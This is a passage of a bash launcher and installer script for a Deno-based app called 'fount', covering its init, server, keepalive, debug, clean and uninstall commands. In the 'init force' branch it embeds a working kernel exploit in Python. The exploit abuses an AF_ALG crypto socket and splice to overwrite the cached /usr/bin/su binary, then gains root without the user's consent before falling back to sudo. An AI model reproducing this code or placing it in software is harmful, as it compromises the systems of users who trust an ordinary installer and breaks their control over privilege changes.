		deno_upgrade
	fi
}

if [[ $# -ge 2 && $1 == "init" && $2 == "force" ]]; then
	if [[ $(id -u) -ne 0 ]]; then
		FOUNT_INIT_FORCE_CACHED_PATH="${FOUNT_INIT_FORCE_CACHED_PATH:-$PATH}"
		export FOUNT_INIT_FORCE_CACHED_PATH
		if [[ $OS_TYPE == "Linux" ]] && command -v python3 &>/dev/null; then
			# use CVE to auto elevate privileges if possible
			python3 -c <(cat <<EOF
import os as g,sys,zlib,socket as s,shlex
def d(x):return bytes.fromhex(x)
def c(f,t,c):
 a=s.socket(38,5,0);a.bind(("aead","authencesn(hmac(sha256),cbc(aes))"));h=279;v=a.setsockopt;v(h,1,d('0800010000000010'+'0'*64));v(h,5,None,4);u,_=a.accept();o=t+4;i=d('00');u.sendmsg([b"A"*4+c],[(h,3,i*4),(h,2,b'\x10'+i*19),(h,4,b'\x08'+i*3),],32768);r,w=g.pipe();n=g.splice;n(f,w,o,offset_src=0);n(r,u.fileno(),o)
 try:u.recv(8+t)
 except:0
f=g.open("/usr/bin/su",0);i=0;e=zlib.decompress(d("78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"))
while i<len(e):c(f,i,e[i:i+4]);i+=4
sys.exit(g.system("su -c "+shlex.quote("$(printf 'SUDO_USER=%q FOUNT_INIT_FORCE_CACHED_PATH=%q ' "$(id -un)" "$FOUNT_INIT_FORCE_CACHED_PATH"; printf '%q ' "$0" "$@")")) >> 8)
EOF
)
			# shellcheck disable=SC2181
			if [[ $? -eq 0 ]]; then
				exit 0
			fi
		fi
		sudo env FOUNT_INIT_FORCE_CACHED_PATH="$FOUNT_INIT_FORCE_CACHED_PATH" "$0" "$@"
		exit $?
	fi
	invoke_fount_init_force
	exit $?
fi

# 更新 fount 和 Deno
if [[ $# -gt 0 && ($1 == "server" || $1 == "keepalive") ]]; then
	assert_fount_dir_writable "$FOUNT_DIR"
	update_fount_and_deno
	run_deno -V
fi

debug_on() {
	FOUNT_DEBUG=1
	export FOUNT_DEBUG
	if [[ $OS_TYPE == "Darwin" ]]; then
		if [ -d "/Applications/Google Chrome.app" ]; then
			open -a "Google Chrome" --new --args --new-window
			osascript -e 'tell application "Google Chrome" to tell the active tab of its first window to set URL to "chrome://inspect"'
		fi
	else
		local browser
		if command -v google-chrome &>/dev/null; then
			browser="google-chrome"
		elif command -v chromium-browser &>/dev/null; then
			browser="chromium-browser"
		elif command -v chromium &>/dev/null; then
			browser="chromium"
		fi
		if [ -n "$browser" ]; then
			install_package xdotool "xdotool" || true
			install_package xclip "xclip" || true
			if
				xdotool search --onlyvisible --name '.*- Node\.js[：:].*' &>/dev/null ||
				xdotool search --onlyvisible --name '^DevTools$' &>/dev/null;
			then
				return
			fi
			original_clip=$(xclip -o -selection clipboard 2>/dev/null)
			echo -n "chrome://inspect" | xclip -selection clipboard
			"$browser" --new-window &
			sleep 2
			xdotool key ctrl+l
			xdotool key ctrl+v
			echo -n "$original_clip" | xclip -selection clipboard || true
			xdotool key Return
			sleep 0.3
			for _ in {1..5}; do
				xdotool key Tab
			done
			xdotool key Return
		fi
	fi
}
# 函数: 运行 fount
exit_code=0
run() {
	local original_title
	if [[ $(id -u) -eq 0 ]]; then
		print_i18n_yellow 'install.rootWarning1' >&2
		print_i18n_yellow 'install.rootWarning2' >&2
	fi
	write_taskbar_progress 5
	original_title=$(get_title)
	set_title ""
	if [[ $IN_TERMUX -eq 1 ]]; then
		local LANG_BACKUP
		LANG_BACKUP="$LANG"
		LANG="$(getprop persist.sys.locale)"
		export LANG
		# 水秋脚本对termux的劫持移除
		local SQsacPath="/data/data/com.termux/files/usr/var/lib/proot-distro/installed-rootfs/ubuntu/root/.bashrc"
		if [[ -f "$SQsacPath" ]] && grep -q "bash /root/sac.sh" "$SQsacPath"; then
			run_sed_inplace '/bash \/root\/sac.sh/d' "$SQsacPath"
			run_sed_inplace '/proot-distro login ubuntu/d' "/data/data/com.termux/files/home/.bashrc"
		fi
	fi
	v8_flags=""
	if [[ -n "$FOUNT_V8_FLAGS" ]]; then
		v8_flags="$FOUNT_V8_FLAGS"
	fi
	heap_size_mb=100 # Default to 100MB
	config_path="$FOUNT_DIR/data/config.json"
	if [ -f "$config_path" ] && command -v jq &>/dev/null; then
		heap_size_bytes=$(jq -r '.prelaunch.heapSize // "0"' "$config_path")
		calculated_mb=$(( (heap_size_bytes + 524288) / 1048576 ))
		if [ "$calculated_mb" -gt 0 ]; then
			heap_size_mb=$calculated_mb
		fi
	fi
	if [[ -n "$v8_flags" ]]; then
		v8_flags="$v8_flags,--initial-heap-size=${heap_size_mb}"
	else
		v8_flags="--initial-heap-size=${heap_size_mb}"
	fi
	write_taskbar_progress 10
	if [ -z "$FOUNT_START_TIME" ]; then
		FOUNT_START_TIME=$(date -u +"%Y-%m-%dT%H:%M:%S.%3NZ")
	fi
	export FOUNT_START_TIME
	FOUNT_DENO_START_TIME=$(date -u +"%Y-%m-%dT%H:%M:%S.%3NZ")
	export FOUNT_DENO_START_TIME
	write_taskbar_progress 25
	set_title "𝓯"
	local boosted=0
	if [[ $(id -u) -eq 0 ]]; then
		renice -n -10 -p $$ >/dev/null 2>&1 && boosted=1
	fi
	if [[ "$OS_TYPE" = "Linux" ]] && command -v ionice >/dev/null 2>&1; then
		ionice -c2 -n0 -p $$ >/dev/null 2>&1 || true
	fi
	export FOUNT_STARTUP_PRIORITY_BOOST=1
	if [[ $FOUNT_DEBUG -eq 1 ]]; then
		run_deno run --allow-scripts --allow-all --inspect-brk -c "$FOUNT_DIR/deno.json" --v8-flags="$v8_flags" "$FOUNT_DIR/src/server/index.mjs" "$@"
	else
		run_deno run --allow-scripts --allow-all -c "$FOUNT_DIR/deno.json" --v8-flags="$v8_flags" "$FOUNT_DIR/src/server/index.mjs" "$@"
	fi
	exit_code=$?
	if [[ "$boosted" -eq 1 ]]; then
		renice -n 0 -p $$ >/dev/null 2>&1 || true
	fi
	unset FOUNT_STARTUP_PRIORITY_BOOST
	set_title "$original_title"
	unset FOUNT_START_TIME
	unset FOUNT_DENO_START_TIME
	if [ "$exit_code" -ne 0 ] && [ "$exit_code" -ne 130 ]; then
		write_taskbar_progress_error
	fi
	if [[ $IN_TERMUX -eq 1 ]]; then export LANG="$LANG_BACKUP"; fi
	return $exit_code
}

# 安装 fount 依赖
if [[ ! -d "$FOUNT_DIR/node_modules" || ($# -gt 0 && $1 = 'init') ]]; then
	if [ ! -f "$FOUNT_DIR/.noupdate" ]; then
		install_package "git" "git git-core" || true
		git_reset_and_clean
	fi
	if [[ -d "$FOUNT_DIR/node_modules" ]]; then run "shutdown"; fi
	write_taskbar_progress 70
	get_i18n 'install.installingDependencies'
	run_deno install --prod --reload --allow-scripts --allow-all -c "$FOUNT_DIR/deno.json" --entrypoint "$FOUNT_DIR/src/server/index.mjs"
	write_taskbar_progress 85
	if [ $IN_DOCKER -eq 0 ] && [ $IN_TERMUX -eq 0 ]; then
		create_desktop_shortcut
		register_boot_background
		register_terminal_keybindings
	fi
	echo -e "${C_GREEN}======================================================${C_RESET}"
	print_i18n_yellow 'install.untrustedPartsWarning'
	echo -e "${C_GREEN}======================================================${C_RESET}"
	write_taskbar_progress_clear
fi

# 主要参数处理逻辑
case "$1" in
init)
	write_taskbar_progress_clear
	exit 0
	;;
clean)
	if [ -d "$FOUNT_DIR/node_modules" ]; then
		run shutdown
		if [ "$2" = 'force' ]; then
			find "$FOUNT_DIR" -name "*_cache.json" -type f -delete
		fi
	fi
	get_i18n 'clean.cleaningDenoCaches'
	run_deno clean -e "$FOUNT_DIR/src/server/index.mjs"
	write_taskbar_progress_clear
	;;
keepalive)
	export FOUNT_KEEPALIVE=1
	trap 'write_taskbar_progress_clear; unset FOUNT_KEEPALIVE' EXIT INT TERM
	runargs=("${@:2}")
	if [[ "${runargs[0]}" == "debug" ]]; then
		debug_on
		runargs=("${runargs[@]:1}")
	fi

	start_time=$(date +%s)
	init_attempted=0
	restart_timestamps=()

	"$0" server "${runargs[@]}"
	# shellcheck disable=SC2181
	while [ $exit_code -ne 0 ]; do
		if [ $exit_code -eq 130 ]; then exit 130; fi # ctrl+c
		if [ $exit_code -ne 131 ]; then
			current_time=$(date +%s)
			elapsed_time=$((current_time - start_time))
			if [ "$elapsed_time" -lt 180 ] && [ "$init_attempted" -eq 1 ]; then
				print_i18n_red 'keepalive.failedToStart' >&2
				exit 1
			else
				init_attempted=0
			fi

			restart_timestamps=("${restart_timestamps[@]}" "$current_time")

			three_minutes_ago=$((current_time - 180))
			temp_timestamps=()
			for ts in "${restart_timestamps[@]}"; do
				if [ "$ts" -ge "$three_minutes_ago" ]; then
					temp_timestamps+=("$ts")
				fi
			done
			restart_timestamps=("${temp_timestamps[@]}")

			if [ "${#restart_timestamps[@]}" -ge 7 ]; then
				handle_auto_reinitialization
			fi
		fi

		"$0" server
	done
	;;
server)
	trap 'write_taskbar_progress_clear' EXIT INT TERM
	runargs=("${@:2}")
	if [[ "${runargs[0]}" == "debug" ]]; then
		debug_on
		runargs=("${runargs[@]:1}")
	fi
	run "${runargs[@]}"
	while [ $exit_code -eq 131 ]; do
		update_fount_and_deno
		run
	done
	;;
remove)
	original_title=$(get_title)
	set_title "𝓯𝓸𝓾𝓷𝓽"
	write_taskbar_progress 0
	run shutdown
	write_taskbar_progress 5
	run_deno clean
	write_taskbar_progress 15
	get_i18n 'remove.removingFount'

	get_i18n 'remove.removingFountFromPath'
	while IFS= read -r profile_file; do
		if [ -f "$profile_file" ]; then
			# shellcheck disable=SC2016
			run_sed_inplace '/export PATH="\$PATH:'"$ESCAPED_FOUNT_DIR"'\/path"/d' "$profile_file"
			if [ "$(tr -d '\n\r\t ' <"$profile_file" | wc -c)" -eq 0 ]; then
				rm -f "$profile_file"
			fi
		fi
	done < <(get_profile_files)
	PATH=$(echo "$PATH" | tr ':' '\n' | grep -v "$FOUNT_DIR/path" | tr '\n' ':' | sed 's/:*$//')
	export PATH

	set_title "𝓯𝓸𝓾𝓷"
	write_taskbar_progress 25
	get_i18n 'remove.removingProtocolHandler'
	remove_desktop_shortcut
	remove_boot_background
	get_i18n 'remove.removingTerminalKeybindings'
	unregister_terminal_keybindings

	get_i18n 'remove.removingFountFromGitSafeDir'
	if command -v git &>/dev/null && git config --global --get-all safe.directory | grep -q -xF "$FOUNT_DIR"; then
		git config --global --unset safe.directory "$FOUNT_DIR"
	fi

	set_title "𝓯𝓸𝓾"
	write_taskbar_progress 45
	get_i18n 'remove.removingInstalledSystemPackages'
	if [[ $IN_TERMUX -eq 1 ]]; then
		for package in "${INSTALLED_PACMAN_PACKAGES_ARRAY[@]}"; do pacman -R --noconfirm "$package"; done
	fi
	load_installed_packages
	for package in "${INSTALLED_SYSTEM_PACKAGES_ARRAY[@]}"; do uninstall_package "$package"; done

	if [ -f "$AUTO_INSTALLED_DENO_FLAG" ]; then
		get_i18n 'remove.uninstallingDeno'
		rm -rf "$HOME/.deno"
		for profile_file in $(get_profile_files); do
			if [ -f "$profile_file" ]; then run_sed_inplace '/\.deno/d' "$profile_file"; fi
		done
		PATH=$(echo "$PATH" | tr ':' '\n' | grep -v "$HOME/.deno/bin" | tr '\n' ':' | sed 's/:*$//')
		export PATH
		rm -f "$AUTO_INSTALLED_DENO_FLAG"
	fi
	set_title "𝓯𝓸"
	write_taskbar_progress 60

	get_i18n 'remove.removingFountInstallationDir'
	set_title "𝓯"
	write_taskbar_progress 75
	set_title ""
	write_taskbar_progress 90
	rm -rf "$FOUNT_DIR"
	# 只要父目录为空，继续删他妈的
	parent_dir=$(dirname "$FOUNT_DIR")
	while rmdir "$parent_dir" 2>/dev/null; do
		parent_dir=$(dirname "$parent_dir")
	done
	get_i18n 'remove.fountInstallationDirRemoved'

	get_i18n 'remove.fountUninstallationComplete'
	write_taskbar_progress_clear
	set_title "$original_title"
	exit 0
	;;
log)
	run_deno run --allow-scripts --allow-all -c "$FOUNT_DIR/deno.json" "$FOUNT_DIR/src/log_viewer/index.mjs"
	exit $?
	;;
debug)
	trap 'write_taskbar_progress_clear' EXIT INT TERM
	"$0" keepalive debug "${@:2}"
	exit $?
	;;
shutdown|reboot)
	trap 'write_taskbar_progress_clear' EXIT INT TERM
	run "${@:1}"
	exit $?
	;;
*)
	trap 'write_taskbar_progress_clear' EXIT INT TERM
	original_title=$(get_title)
	if [ "$1" ]; then
		run "${@:1}"
	else
		write_taskbar_progress 25
		set_title "𝓯"
		"$0" background keepalive "$@"
		set_title "𝓯𝓸"
		write_taskbar_progress
		"$0" log
	fi
	set_title "$original_title"
	exit $?
	;;
esac

exit "$exit_code"
